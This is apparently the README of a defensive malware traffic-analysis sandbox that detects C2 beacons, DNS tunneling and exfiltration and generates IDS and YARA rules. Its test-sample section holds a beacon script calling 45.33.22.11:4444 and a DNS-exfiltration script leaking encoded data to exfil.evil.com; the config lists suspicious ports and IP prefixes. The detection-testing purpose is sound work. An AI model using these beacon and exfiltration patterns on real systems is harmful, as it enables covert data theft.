# Protocol Decoder Ring

> A network protocol sandbox that analyzes how malware communicates — capturing traffic, detecting threats, and automatically generating detection signatures.

## Built With


<p align="center">
  <img src="https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" />
  <img src="https://img.shields.io/badge/Scapy-FF6B6B?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/NumPy-013243?style=for-the-badge&logo=numpy&logoColor=white" />
  <img src="https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas&logoColor=white" />
  <img src="https://img.shields.io/badge/Scikit--Learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white" />
  <img src="https://img.shields.io/badge/SciPy-8CAAE6?style=for-the-badge&logo=scipy&logoColor=white" />
  <img src="https://img.shields.io/badge/YARA-00BFFF?style=for-the-badge&logo=virustotal&logoColor=white" />
  <img src="https://img.shields.io/badge/Snort-FF0000?style=for-the-badge&logo=snort&logoColor=white" />
  <img src="https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white" />
  <img src="https://img.shields.io/badge/D3.js-F9A03C?style=for-the-badge&logo=d3.js&logoColor=white" />
  <img src="https://img.shields.io/badge/Chart.js-FF6384?style=for-the-badge&logo=chart.js&logoColor=white" />
  <img src="https://img.shields.io/badge/Bootstrap-7952B3?style=for-the-badge&logo=bootstrap&logoColor=white" />
  <img src="https://img.shields.io/badge/Socket.io-010101?style=for-the-badge&logo=socket.io&logoColor=white" />
  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" />
  <img src="https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white" />
  <img src="https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white" />
</p>

<p align="center">
  <br>
  <sub>Built by <strong>Zoye-J</strong> · © 2026</sub>
</p>

---

## What is this?

Protocol Decoder Ring (PDR) is a malware network analysis platform. You give it a suspicious file, it runs the file inside an isolated sandbox while capturing all network traffic, then automatically analyzes that traffic to find C2 beacons, DNS tunneling, data exfiltration, and covert channels. It outputs human-readable reports and machine-deployable detection rules in Snort, Suricata, YARA, and Sigma formats.

*"Traditional sandboxes look at files. We look at COMMUNICATION."*

---

## Architecture

```
Suspicious File
      │
      ▼
┌─────────────────────────────────────────────────────┐
│                  Module 1: Sandbox                  │
│   Isolated temp dir · Process monitoring · Timeout  │
└──────────────────────┬──────────────────────────────┘
                       │ runs alongside
┌──────────────────────▼──────────────────────────────┐
│              Module 2: Packet Capture               │
│     Scapy/Npcap · BPF filters · PCAP export         │
└──────────────────────┬──────────────────────────────┘
                       │ captured packets
          ┌────────────┴────────────┐
          ▼                         ▼
┌─────────────────┐       ┌───────────────────────┐
│   Module 3:     │       │      Module 4:        │
│   Protocol      │       │  Exfiltration         │
│   Analyzer      │       │  Detector             │
│                 │       │                       │
│ · C2 beacons    │       │ · Large transfers     │
│ · DNS tunneling │       │ · Covert channels     │
│ · Entropy check │       │ · Timing channels     │
│ · HTTP anomaly  │       │ · DNS/ICMP/HTTP exfil │
└────────┬────────┘       └──────────┬────────────┘
         └──────────┬────────────────┘
                    ▼
         ┌──────────────────┐
         │    Module 5:     │
         │   Signature      │
         │   Generator      │
         │                  │
         │  Snort · Suricata│
         │  YARA · Sigma    │
         │  Custom JSON     │
         └────────┬─────────┘
                  ▼
         ┌──────────────────┐
         │    Module 6:     │
         │  Web Dashboard   │
         │  Flask + Socket  │
         └──────────────────┘
```

---

## Features

### Sandbox (Module 1)
- Creates an isolated temporary directory for each analysis session
- Runs suspicious executables with redirected environment variables
- Monitors CPU and memory usage in real time via `psutil`
- Enforces configurable timeouts (default 5 minutes)
- Automatic cleanup — no artifacts left on the host system
- Context manager support (`with SandboxManager() as sandbox`)

### Packet Capture (Module 2)
- Captures live traffic using Scapy + Npcap (Windows) or libpcap (Linux)
- BPF filter support for targeted capture
- Saves to standard `.pcap` format — open directly in Wireshark
- Real-time statistics (rate, volume, protocol breakdown)
- Loads existing PCAP files for offline analysis

### Protocol Analyzer (Module 3)
- Signature-based protocol identification (HTTP, DNS, TLS, SSH, SMB, FTP)
- **Shannon entropy analysis** — detects encrypted or obfuscated payloads
- **C2 beacon detection** — identifies regular heartbeat patterns using coefficient of variation
- **DNS tunneling detection** — flags long queries, high-entropy domains, excessive subdomains
- **Packet size analysis** — detects fixed-size covert channels
- **Timing pattern analysis** — identifies repeating inter-arrival intervals
- HTTP anomaly detection (suspicious methods, unusually long URIs)
- Reconstructs bidirectional TCP/UDP flows

### Exfiltration Detector (Module 4)
- Detects large outbound data transfers (configurable threshold)
- **DNS exfiltration** — high query volume, oversized packets, consistent sizing
- **ICMP tunneling** — large ping payloads, unusual volumes
- **HTTP exfiltration** — large POST uploads, beaconing patterns
- **Covert channel detection** — fixed packet sizes, alternating binary encoding
- **Timing channel detection** — microsecond-precision interval analysis
- Data rate spike detection using statistical outlier analysis
- Suspicious destination IP range flagging (configurable)

### Signature Generator (Module 5)
- Automatically extracts patterns from analysis alerts
- Generates **Snort IDS rules** — valid syntax, immediately deployable
- Generates **Suricata rules** — with `dns.query` keyword support
- Generates **YARA rules** — for memory and file scanning
- Generates **Sigma rules** — SIEM-compatible (Splunk, Elastic, QRadar)
- Exports **Custom JSON** threat intelligence
- Configurable confidence thresholds and rule prefixes

### Web Dashboard (Module 6)
- Dark-themed cybersecurity UI built with Flask + Bootstrap 5
- Real-time updates via Socket.IO WebSockets
- Upload files for analysis directly from the browser
- Live packet capture with interface selection
- Interactive alert explorer with severity filtering
- Signature viewer with syntax display and one-click download
- Report library with compare and export features
- REST API at `/api/v1/` and `/api/v2/`

---

## Detection Capabilities

| Threat | Detection Method | Severity |
|--------|-----------------|----------|
| C2 Beacon | Regular interval analysis (CV < 0.3) | HIGH |
| DNS Tunneling | Query length + entropy + subdomain depth | HIGH |
| DNS Exfiltration | Query volume + packet size consistency | HIGH |
| ICMP Tunneling | Oversized ping payloads | HIGH |
| Covert Channel | Fixed or alternating packet sizes | HIGH |
| Timing Channel | Microsecond interval regularity | HIGH |
| Data Exfiltration | Volume threshold + rate spikes | HIGH |
| Encrypted Traffic | Shannon entropy > 0.8 | MEDIUM |
| Suspicious Ports | Configurable port watchlist | LOW |
| HTTP Anomalies | Unusual methods, long URIs | MEDIUM |

---

## Requirements

### System
- Windows 10/11 or Linux
- Python 3.11 (recommended)
- [Npcap](https://npcap.com) for packet capture on Windows
- Administrator or root privileges for live packet capture

### Python packages
```
scapy>=2.5.0
psutil>=5.9.8
numpy>=1.24.0
flask>=3.1.0
flask-socketio>=5.3.0
PyYAML>=6.0
pyshark>=0.6
cryptography>=44.0.0
```

---

## Installation

### 1. Clone the repository
```bash
git clone https://github.com/yourusername/Protocol-Decoder-Ring.git
cd Protocol-Decoder-Ring
```

### 2. Create a Python 3.11 virtual environment
```bash
# Windows
py -3.11 -m venv venv
venv\Scripts\activate

# Linux / macOS
python3.11 -m venv venv
source venv/bin/activate
```

### 3. Install dependencies
```bash
pip install -r requirements.txt
```

### 4. Install Npcap (Windows only)
Download from [https://npcap.com](https://npcap.com) and install with **"WinPcap API-compatible Mode"** checked.

### 5. Verify the installation
```bash
python -c "from scapy.all import sniff; print('Scapy OK')"
python -c "import flask; print('Flask', flask.__version__)"
```

---

## Usage

### Start the dashboard

```bash
# Run as Administrator (required for packet capture)
venv\Scripts\activate
python app.py
```

Open `http://localhost:5000` in your browser.

### Run individual modules for testing

```bash
python modules/sandbox_manager.py      # Test Module 1
python modules/packet_capture.py       # Test Module 2 (requires Admin)
python modules/protocol_analyzer.py    # Test Module 3
python test_exfil.py                   # Test Module 4
python test_signatures.py              # Test Module 5
```

### Analyze a file via the dashboard
1. Open `http://localhost:5000`
2. Click **New Analysis**
3. Upload a suspicious executable (`.exe`, `.bat`, `.ps1`)
4. Wait 30 seconds for the analysis to complete
5. View results in **Alerts**, **Signatures**, and **Reports**

### Analyze a PCAP file offline
```python
from modules.packet_capture import PacketCapture
from modules.protocol_analyzer import ProtocolAnalyzer

capture = PacketCapture()
capture.load_pcap("path/to/capture.pcap")
packets = capture.get_packets()

analyzer = ProtocolAnalyzer()
analyzer.load_packets(packets)
results = analyzer.analyze()
analyzer.generate_report("text")
```

---

## Creating Test Samples

You can create your own traffic generators to test the system without using real malware.

### C2 beacon simulation
```python
# test_samples/fake_c2.py
import socket, time

for i in range(20):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("45.33.22.11", 4444))
        s.send(f"BEACON|{i}|victim-pc".encode())
        s.close()
    except:
        pass
    time.sleep(5)  # Regular 5-second intervals triggers C2 detection
```

### DNS tunneling simulation
```python
# test_samples/fake_dns_tunnel.py
import socket, base64, time

data = "STOLEN_DATA: sensitive information here"
encoded = base64.b64encode(data.encode()).decode()

for i in range(0, len(encoded), 30):
    chunk = encoded[i:i+30]
    try:
        socket.gethostbyname(f"{chunk}.exfil.evil.com")
    except:
        pass
    time.sleep(0.3)
```

### Running test files through the dashboard
Wrap your Python script in a `.bat` file and upload it:
```batch
@echo off
C:\path\to\venv\Scripts\python.exe %~dp0fake_c2.py
```

---

## Configuration

Edit `config/settings.json` to customize detection thresholds:

```json
{
  "sandbox": {
    "timeout_seconds": 300,
    "max_memory_mb": 1024,
    "network_isolation": true
  },
  "packet_capture": {
    "interface": null,
    "capture_filter": "",
    "max_packets": 10000,
    "capture_timeout": 60
  },
  "protocol_analysis": {
    "entropy_threshold": 0.8,
    "suspicious_ports": [4444, 5555, 6667, 8080, 3389],
    "dns_tunneling_threshold": 0.7
  },
  "exfiltration_detection": {
    "data_rate_threshold_kbps": 100,
    "suspicious_ip_ranges": ["45.", "185.", "188."],
    "exfiltration": {
      "outbound_threshold_mb": 10
    }
  },
  "signature_generation": {
    "snort_version": "2.9",
    "suricata_compatible": true,
    "yara_rules": true,
    "sigma_rules": true,
    "min_confidence": 0.7
  }
}
```

---

## API Reference

### Core endpoints
```
GET  /api/v1/status                    System health and module status
GET  /api/v1/analyses                  List all analyses
GET  /api/v1/analysis/<id>             Get specific analysis results
GET  /api/v1/alerts                    Get all alerts (filterable by severity)
GET  /api/v1/signatures                List generated signature files
GET  /api/v1/reports                   List generated reports
GET  /api/v1/file/<path>               Read file content for display
GET  /api/v1/download/<path>           Download a file
POST /api/v1/analyze/file              Submit file for analysis *
POST /api/v1/signatures/generate       Generate signatures from analysis *
```

### Extended endpoints (v2)
```
GET  /api/v2/export/analysis/<id>      Export as JSON, CSV, or HTML
GET  /api/v2/search                    Search across analyses and alerts
GET  /api/v2/stats/summary             Aggregate statistics
POST /api/v2/compare                   Compare two analyses side by side
```

`*` Requires `X-API-Key` header. Set via `PDR_API_KEY` environment variable.

---

## Project Structure

```
Protocol-Decoder-Ring/
├── app.py                          # Entry point — Flask app
├── requirements.txt
├── config/
│   └── settings.json               # Detection thresholds and config
├── modules/
│   ├── sandbox_manager.py          # Module 1
│   ├── packet_capture.py           # Module 2
│   ├── protocol_analyzer.py        # Module 3
│   ├── exfiltration_detector.py    # Module 4
│   ├── signature_generator.py      # Module 5
│   └── dashboard/
│       ├── api.py                  # API v2 Blueprint
│       ├── templates/              # Jinja2 HTML templates
│       └── static/                 # CSS, JS
├── signatures/
│   ├── snort/                      # Generated .rules files
│   ├── suricata/                   # Generated .rules files
│   ├── yara/                       # Generated .yar files
│   ├── sigma/                      # Generated .yml files
│   └── custom/                     # JSON threat intelligence
├── output/
│   ├── analysis/                   # Analysis result JSON
│   ├── captures/                   # PCAP files
│   └── exfiltration/               # Exfiltration reports
├── logs/                           # Per-session logs
├── reports/                        # Human-readable reports
└── data/
    ├── sample_pcaps/               # Test PCAP files
    └── malicious_samples/          # Safe test executables
```

---

## How Signature Generation Works

```
Alert: C2 beacon → 45.33.22.11:4444, interval=5.01s, confidence=0.9
                              │
                    Pattern extraction
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
        Snort rule       YARA rule       Sigma rule
     alert tcp ...    rule PDR_C2 {    title: C2 Server
     45.33.22.11 4444  strings: $ip    detection:
     flags:S;          condition: any    DestinationIp
     priority:1;     }                   DestinationPort
```

All generated rules are valid syntax — Snort and Suricata rules can be loaded directly into a running IDS, YARA rules work with the `yara` CLI or VirusTotal, and Sigma rules can be converted for any SIEM platform.

---

## Troubleshooting

**No packets captured (0 packets)**
Run your terminal as Administrator. Ensure `"interface": null` in `settings.json`.

**Scapy crashes on import**
Use Python 3.11. Python 3.13 has compatibility issues with several security libraries.

**Flask won't start**
```bash
pip install --upgrade flask werkzeug markupsafe flask-socketio
```

**Modals open but page goes dark and unresponsive**
Remove `z-index: 1` from `.main-wrapper` in `base.html`. This creates a stacking context that traps Bootstrap modals below the backdrop.

**Double log lines in console**
Add `if logger.handlers: return logger` at the start of any `_setup_logging()` method.

---

## Limitations

- **Not kernel-level isolation** — Module 1 provides directory and environment isolation but not VM or container-based sandboxing. Sophisticated malware may detect or escape the environment.
- **No network blocking** — Traffic is observed and analyzed, not blocked. The analyzed process makes real outbound connections.
- **Windows-focused** — Live capture on Linux works but requires `libpcap` and root privileges. The sandbox uses Windows-specific process flags.
- **Signature quality** — Auto-generated rules may produce false positives in production environments. Human review before deployment is recommended.

---

## Roadmap

- [ ] Windows Filtering Platform (WFP) for true network isolation
- [ ] Docker container support
- [ ] ML-based C2 classification (scikit-learn)
- [ ] VirusTotal hash lookup integration
- [ ] MITRE ATT&CK framework mapping for alerts
- [ ] Automated PCAP replay for re-analysis
- [ ] Batch analysis for multiple samples
- [ ] STIX/TAXII threat intelligence export
- [ ] Email/webhook alerting for high-severity findings

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Language | Python 3.11 |
| Web framework | Flask 3.1 + Flask-SocketIO |
| Packet capture | Scapy 2.5 + Npcap |
| Numerical analysis | NumPy |
| Frontend | Bootstrap 5, Chart.js, Socket.IO |
| Fonts | JetBrains Mono, Space Grotesk |
| Rule formats | Snort, Suricata, YARA, Sigma |

---

## Contributing

Contributions are welcome. For significant changes, open an issue first to discuss what you'd like to change.

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/fft-beacon-detection`)
3. Commit your changes (`git commit -m 'Add FFT-based beacon period detection'`)
4. Push to the branch (`git push origin feature/fft-beacon-detection`)
5. Open a Pull Request

---

## Disclaimer

This tool is intended for **educational purposes, authorized security research, and defensive security work only**. Only analyze files and network traffic you have explicit permission to analyze. Running malware samples carries inherent risk — use in an isolated, air-gapped environment whenever possible. The authors are not responsible for misuse.

---

## License

![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) — see [LICENSE](LICENSE) for details.

---

*Built as a learning project exploring malware network behavior, protocol analysis, and automated threat detection.*